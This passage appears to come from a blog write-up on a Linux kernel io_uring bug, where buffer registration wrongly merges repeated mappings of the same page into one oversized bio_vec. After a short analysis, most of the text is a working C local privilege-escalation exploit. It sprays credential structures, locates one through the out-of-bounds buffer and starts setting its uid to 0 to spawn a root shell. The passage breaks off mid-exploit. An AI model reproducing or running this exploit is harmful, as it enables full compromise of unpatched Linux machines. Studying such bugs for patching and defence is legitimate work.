*/</span><br><span class="hljs-keyword">if</span> (nr_pages &gt; <span class="hljs-number">1</span>) &#123; <span class="hljs-comment">// if more than one page</span><br>folio = page_folio(pages[<span class="hljs-number">0</span>]); <span class="hljs-comment">// converts from page to folio</span><br><span class="hljs-comment">// returns the folio that contains this page</span><br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">1</span>; i &lt; nr_pages; i++) &#123;<br><span class="hljs-keyword">if</span> (page_folio(pages[i]) != folio) &#123; <span class="hljs-comment">// different folios -&gt; not physically contiguous </span><br>folio = <span class="hljs-literal">NULL</span>; <span class="hljs-comment">// set folio to NULL as we cannot coalesce into a single entry</span><br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span> (folio) &#123; <span class="hljs-comment">// if all the pages are in the same folio</span><br>folio_put_refs(folio, nr_pages - <span class="hljs-number">1</span>); <br>nr_pages = <span class="hljs-number">1</span>; <span class="hljs-comment">// sets nr_pages to 1 as it can be represented as a single folio page</span><br>&#125;<br>&#125;<br>...<br></code></pre></td></tr></table></figure><p>The code that checks if the pages are from the same folio doesn’t actually check if they are consecutive. It can be the same page mapped multiple times. During the iteration <code>page_folio(page)</code> would return the same folio again and again passing the checks. This is an obvious logic bug. Let’s continue with <code>io_sqe_buffer_register</code> and see what the fallout is.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c">...<br>imu = kvmalloc(struct_size(imu, bvec, nr_pages), GFP_KERNEL); <br><span class="hljs-comment">// allocates imu with an array for nr_pages bio_vec(s)</span><br><span class="hljs-comment">// bio_vec - a contiguous range of physical memory addresses</span><br><span class="hljs-comment">// we need a bio_vec for each (physical) page</span><br>    <span class="hljs-comment">// in the case of a folio - the array of bio_vec(s) will be of size 1</span><br><span class="hljs-keyword">if</span> (!imu)<br><span class="hljs-keyword">goto</span> done;<br><br>ret = io_buffer_account_pin(ctx, pages, nr_pages, imu, last_hpage);<br><span class="hljs-keyword">if</span> (ret) &#123;<br>unpin_user_pages(pages, nr_pages);<br><span class="hljs-keyword">goto</span> done;<br>&#125;<br><br>off = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) iov-&gt;iov_base &amp; ~PAGE_MASK;<br>size = iov-&gt;iov_len; <span class="hljs-comment">// sets the size to that passed by the user!</span><br><span class="hljs-comment">/* store original address for later verification */</span><br>imu-&gt;ubuf = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) iov-&gt;iov_base; <span class="hljs-comment">// user-controlled</span><br>imu-&gt;ubuf_end = imu-&gt;ubuf + iov-&gt;iov_len; <span class="hljs-comment">// calculates the end based on the length</span><br>imu-&gt;nr_bvecs = nr_pages; <span class="hljs-comment">// this would be 1 in the case of folio</span><br>*pimu = imu;<br>ret = <span class="hljs-number">0</span>;<br><br><span class="hljs-keyword">if</span> (folio) &#123; <span class="hljs-comment">// in case of folio - we need just a single bio_vec (efficiant!)</span><br>bvec_set_page(&amp;imu-&gt;bvec[<span class="hljs-number">0</span>], pages[<span class="hljs-number">0</span>], size, off);<br><span class="hljs-keyword">goto</span> done;<br>&#125;<br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; nr_pages; i++) &#123; <br><span class="hljs-type">size_t</span> vec_len;<br><br>vec_len = <span class="hljs-type">min_t</span>(<span class="hljs-type">size_t</span>, size, PAGE_SIZE - off);<br>bvec_set_page(&amp;imu-&gt;bvec[i], pages[i], vec_len, off);<br>off = <span class="hljs-number">0</span>;<br>size -= vec_len;<br>&#125;<br>done:<br><span class="hljs-keyword">if</span> (ret)<br>kvfree(imu);<br>kvfree(pages);<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><p>A single <code>bio_vec</code> is allocated as <code>nr_pages = 1</code>. The size of the buffer that is written in <code>pimu-&gt;iov_len</code> and <code>pimu-&gt;bvec[0].bv_len</code> is the one passed by the user in <code>iov-&gt;iov_len</code>.</p><h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;liburing.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;mqueue.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/resource.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;netinet/in.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;netinet/tcp.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CRED_DRAIN 100 <span class="hljs-comment">// Wait for modifying the cred cache</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CRED_SPRAY 2000 <span class="hljs-comment">// Number of clones to spray</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PAGE_SIZE 0x1000 <span class="hljs-comment">// Size of a memory page</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_PAGES 100 <span class="hljs-comment">// Maximum number of pages to allocate</span></span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">timespec</span> <span class="hljs-title">timer</span> =</span> &#123;<br>    .tv_sec = <span class="hljs-number">1145141919</span>,<br>    .tv_nsec = <span class="hljs-number">0</span>,<br>&#125;;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> COLOR_RED <span class="hljs-string">&quot;\033[1;31m&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> COLOR_GREEN <span class="hljs-string">&quot;\033[1;32m&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> COLOR_RESET <span class="hljs-string">&quot;\033[0m&quot;</span></span><br><span class="hljs-type">int</span> check_root_pipe[<span class="hljs-number">2</span>];<br><span class="hljs-type">char</span> bin_sh_str[] = <span class="hljs-string">&quot;/bin/sh&quot;</span>;<br><span class="hljs-type">char</span> child_pipe_buf[<span class="hljs-number">1</span>];<br><span class="hljs-comment">// char root_str[] = &quot;Finally get root privilege!\n&quot;;</span><br><span class="hljs-type">char</span> root_str[] = <span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the root.\n&quot;</span><br>                  <span class="hljs-string">&quot;\033[34m[*] Execve root shell now...\033[0m\n&quot;</span>;<br><br><span class="hljs-type">char</span> *shell_args[] = &#123; bin_sh_str, <span class="hljs-literal">NULL</span> &#125;;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">err_exit</span><span class="hljs-params">(<span class="hljs-type">char</span> *buf)</span>&#123;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;%s[-]%s : %s%s\n&quot;</span>, COLOR_RED, buf, strerror(errno), COLOR_RESET);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">check_ret</span><span class="hljs-params">(<span class="hljs-type">int</span> ret,<span class="hljs-type">char</span>* buf)</span>&#123;<br>    <span class="hljs-keyword">if</span>(ret &lt; <span class="hljs-number">0</span>)&#123;<br>        err_exit(buf);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">log_msg</span><span class="hljs-params">(<span class="hljs-type">char</span> *buf)</span>&#123;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stdout</span>, <span class="hljs-string">&quot;[+] %s\n&quot;</span>, buf);<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">log_fail_msg</span><span class="hljs-params">(<span class="hljs-type">char</span> *buf)</span>&#123;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stdout</span>, <span class="hljs-string">&quot;[-] %s\n&quot;</span>, buf);<br>&#125;;<br><span class="hljs-comment">// clear the cred_cache the system have so that when we fork a subprocess, the credential will create with new buddy_memory</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">clear_cred_cache</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; CRED_DRAIN; i++)&#123;<br>        <span class="hljs-type">int</span> ret = fork();<br>        <span class="hljs-keyword">if</span>(!ret)&#123;<br>            read(check_root_pipe[<span class="hljs-number">0</span>],child_pipe_buf,<span class="hljs-number">1</span>);<br>            <span class="hljs-keyword">if</span>(getuid()==<span class="hljs-number">0</span>)&#123;<br>                write(<span class="hljs-number">1</span>, root_str, <span class="hljs-number">80</span>);<br>                system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>            &#125;<br>            sleep(<span class="hljs-number">100000000</span>);<br>        &#125;<br>        check_ret(ret, <span class="hljs-string">&quot;fork fail&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">//clear buddy memory that ord is 0, 1, 2..and so on.</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">clear_buddy</span><span class="hljs-params">()</span>&#123;<br>    log_msg(<span class="hljs-string">&quot;Buddy system cache cleared&quot;</span>);<br>    <span class="hljs-type">void</span>* page[MAX_PAGES];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i =<span class="hljs-number">0</span>; i &lt; MAX_PAGES; i++)&#123;<br>        page[i] = mmap(<span class="hljs-number">0x60000000</span> + i * <span class="hljs-number">0x200000U</span>L, PAGE_SIZE, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>    &#125;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MAX_PAGES; i++)&#123;<br>        *(<span class="hljs-type">char</span> *)page[i] = <span class="hljs-string">&#x27;a&#x27;</span>; <br>    &#125;<br>&#125;<br><br>__attribute__ ((naked)) <span class="hljs-type">long</span> <span class="hljs-title function_">simple_clone</span><span class="hljs-params">(<span class="hljs-type">int</span> flags, <span class="hljs-type">int</span> (*fn)(<span class="hljs-type">void</span> *))</span>&#123;<br>    __asm__ <span class="hljs-title function_">volatile</span> <span class="hljs-params">(</span><br><span class="hljs-params">        <span class="hljs-string">&quot;   mov r15, rsi\n&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   xor rsi, rsi\n&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   xor rdx, rdx\n&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   xor r10, r10\n&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   xor r8, r8\n&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   xor r9, r9\n&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   mov rax, 56\n&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   syscall\n&quot;</span> <span class="hljs-comment">//clone()</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   cmp rax, 0\n&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   je child_fn\n&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   ret\n&quot;</span> <span class="hljs-comment">// parent</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;child_fn:\n&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   jmp r15\n&quot;</span> <span class="hljs-comment">// child</span></span><br><span class="hljs-params">    )</span>;<br>&#125;<br><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">wait_for_root_fn</span><span class="hljs-params">(<span class="hljs-type">void</span> *args)</span>&#123;<br>    <span class="hljs-comment">// Wait for root privilege</span><br>    __asm__ <span class="hljs-title function_">volatile</span> <span class="hljs-params">(</span><br><span class="hljs-params">        <span class="hljs-comment">// read(check_root_pipe[0], child_pipe_buf, 1);</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   lea rax, [check_root_pipe]\n&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   xor rdi, rdi\n&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   mov edi, dword ptr [rax]\n&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   mov rsi, child_pipe_buf\n&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   mov rdx, 1\n&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   xor rax, rax\n&quot;</span> <span class="hljs-comment">// read(check_root_pipe[0], child_pipe_buf, 1)</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   syscall\n&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   mov rax, 102\n&quot;</span> <span class="hljs-comment">//getuid()</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   syscall\n&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   cmp rax, 0\n&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   jne failed\n&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   mov rdi, 1\n&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   lea rdi, [bin_sh_str]\n&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   lea rsi, [shell_args]\n&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   xor rdx, rdx\n&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   mov rax, 59\n&quot;</span> <span class="hljs-comment">// execve(&quot;/bin/sh&quot;, args, NULL)</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   syscall\n&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;failed: \n&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   lea rdi, [timer]\n&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   xor rsi, rsi\n&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   mov rax, 35\n&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   syscall\n&quot;</span> <span class="hljs-comment">// nanosleep(&amp;timer, NULL)</span></span><br><span class="hljs-params">    )</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">cpu_set_t</span> <span class="hljs-built_in">set</span>;<br>CPU_ZERO(&amp;<span class="hljs-built_in">set</span>);<br>CPU_SET(sched_getcpu(), &amp;<span class="hljs-built_in">set</span>);<br><span class="hljs-keyword">if</span> (sched_setaffinity(<span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(<span class="hljs-built_in">set</span>), &amp;<span class="hljs-built_in">set</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>perror(<span class="hljs-string">&quot;sched_setaffinity&quot;</span>);<br><span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br>    <span class="hljs-comment">// clear cred cache</span><br>    <span class="hljs-type">int</span> ret = <span class="hljs-number">0</span>;<br>    <span class="hljs-comment">// io_uring setup</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">io_uring</span> <span class="hljs-title">ring</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">io_uring_sqe</span> *<span class="hljs-title">sqe</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">io_uring_cqe</span> *<span class="hljs-title">cqe</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">iovec</span> <span class="hljs-title">iovec</span>;</span><br>    <span class="hljs-comment">// buffer for read/write operations</span><br>    <span class="hljs-type">int</span> memfd;<br>    <span class="hljs-type">int</span> rw_fd;<br>    <span class="hljs-type">int</span> page_offset = <span class="hljs-number">-1</span>;<br>    <span class="hljs-type">uint64_t</span> start_addr = <span class="hljs-number">0x800000000</span>;<br>    <span class="hljs-type">int</span> nr_pages = <span class="hljs-number">500</span>;<br>    <span class="hljs-type">char</span>* rw_buffer;<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">1000</span>];<br>    log_msg(<span class="hljs-string">&quot;Clearing cred cache&quot;</span>);<br>    pipe(check_root_pipe);<br>    clear_cred_cache();<br>    log_msg(<span class="hljs-string">&quot;Clearing buddy system cache&quot;</span>);<br>    <span class="hljs-comment">// Clear buddy system cache (implementation not shown in the original code)</span><br>    clear_buddy();<br>    log_msg(<span class="hljs-string">&quot;Setting up io_uring&quot;</span>);<br>    check_ret(io_uring_queue_init(<span class="hljs-number">8</span>, &amp;ring, <span class="hljs-number">0</span>), <span class="hljs-string">&quot;io_uring_setup failed&quot;</span>);<br>    <span class="hljs-comment">// io_uring_register_buffers(&amp;ring, iovec, 1);</span><br>    log_msg(<span class="hljs-string">&quot;Preparing buffer for registration&quot;</span>);<br>    <br><br>    <span class="hljs-comment">// Create memfd for io_uring buffer</span><br>    memfd = memfd_create(<span class="hljs-string">&quot;io_register_buf&quot;</span>, MFD_CLOEXEC);<br>    check_ret(memfd, <span class="hljs-string">&quot;memfd_create failed&quot;</span>);<br>    rw_fd = memfd_create(<span class="hljs-string">&quot;read_write_file&quot;</span>, MFD_CLOEXEC);<br>    check_ret(rw_fd, <span class="hljs-string">&quot;memfd_create failed&quot;</span>);<br>    <br>    check_ret(fallocate(memfd, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span> * PAGE_SIZE), <span class="hljs-string">&quot;memfd fallocate failed&quot;</span>);<br>    check_ret(fallocate(rw_fd, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span> * PAGE_SIZE), <span class="hljs-string">&quot;rw_fd fallocate failed&quot;</span>);<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; nr_pages; i++)&#123;<br>        check_ret(mmap(start_addr + i * PAGE_SIZE, PAGE_SIZE, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_FIXED, memfd, <span class="hljs-number">0</span>), <span class="hljs-string">&quot;mmap failed&quot;</span>);<br>    &#125;<br>    <span class="hljs-comment">// Register buffer for io_uring</span><br>    log_msg(<span class="hljs-string">&quot;Registering buffer for io_uring&quot;</span>);<br>    iovec.iov_base = start_addr;<br>    iovec.iov_len = nr_pages * PAGE_SIZE;<br>    rw_buffer = mmap(<span class="hljs-literal">NULL</span>, PAGE_SIZE, PROT_READ|PROT_WRITE, MAP_SHARED, rw_fd, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (rw_buffer == MAP_FAILED) &#123;<br>        perror(<span class="hljs-string">&quot;mmap rw_fd&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br>    check_ret(io_uring_register_buffers(&amp;ring, &amp;iovec, <span class="hljs-number">1</span>), <span class="hljs-string">&quot;io_uring_register_buffers failed&quot;</span>);<br>    <span class="hljs-comment">// spred cred</span><br>    log_msg(<span class="hljs-string">&quot;Spraying credentials&quot;</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; CRED_SPRAY; i++)&#123;<br>        <span class="hljs-comment">// check_ret(simple_clone(CLONE_FILES | CLONE_FS | CLONE_VM | CLONE_THREAD | CLONE_SIGHAND, wait_for_root_fn), &quot;clone failed&quot;);</span><br>        check_ret(simple_clone(CLONE_FILES | CLONE_FS | CLONE_VM | CLONE_SIGHAND, wait_for_root_fn), <span class="hljs-string">&quot;clone failed&quot;</span>);<br>    &#125;<br><br>    log_msg(<span class="hljs-string">&quot;Searching for cred that we sprayed&quot;</span>);<br>    <span class="hljs-comment">// Search for the sprayed credentials</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; nr_pages; i++)&#123;<br>        sqe = io_uring_get_sqe(&amp;ring);<br>        <span class="hljs-keyword">if</span> (sqe == <span class="hljs-literal">NULL</span>) &#123;<br>            err_exit(<span class="hljs-string">&quot;io_uring_get_sqe failed&quot;</span>);<br>        &#125;<br>        io_uring_prep_write_fixed(sqe, rw_fd, start_addr + i*PAGE_SIZE, PAGE_SIZE, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>        check_ret(io_uring_submit(&amp;ring), <span class="hljs-string">&quot;io_uring_submit failed&quot;</span>);<br>        io_uring_wait_cqe(&amp;ring, &amp;cqe);<br>        io_uring_cqe_seen(&amp;ring, cqe);<br>        <span class="hljs-type">int</span> uid = ((<span class="hljs-type">int</span> *)(rw_buffer))[<span class="hljs-number">1</span>];<br>        <span class="hljs-type">int</span> gid = ((<span class="hljs-type">int</span> *)(rw_buffer))[<span class="hljs-number">2</span>];<br>        <span class="hljs-keyword">if</span>(uid == <span class="hljs-number">1000</span> &amp;&amp; gid == <span class="hljs-number">1000</span>)&#123;<br>            log_msg(<span class="hljs-string">&quot;Found the target cred page&quot;</span>);<br>            page_offset = i;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(page_offset &lt; <span class="hljs-number">0</span>)&#123;<br>        log_fail_msg(<span class="hljs-string">&quot;Not find cred page&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    log_msg(<span class="hljs-string">&quot;Editing cred&#x27;s uid to 0&quot;</span>);<br>    <span class="hljs-type">uint32_t</span>* cred = (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *)rw_buffer;<br>    <span class="hljs-comment">// cred[0] = 0x2; // Keep usage 